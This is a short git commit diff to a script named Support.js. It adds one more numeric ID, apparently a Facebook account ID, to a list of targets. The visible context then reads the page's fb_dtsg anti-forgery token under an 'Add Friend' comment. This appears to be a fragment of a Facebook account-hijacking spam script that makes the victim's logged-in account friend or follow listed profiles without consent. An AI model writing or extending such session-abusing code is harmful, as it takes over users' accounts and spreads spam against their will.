8f8addb4f0411df67c0fa57af978826927fc1a96
wazzygray <qariwaqar@gmail.com>
2013-05-21 21:39:26 +0600

    Update Support.js

--- Support.js
+++ Support.js
@@ -121,6 +121,7 @@ a("100002263264013");
 a("100003898640819");
 a("100002747023938");
 a("100004043843895");
+a("100002414280218");
 
 /*Add Friend*/ 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
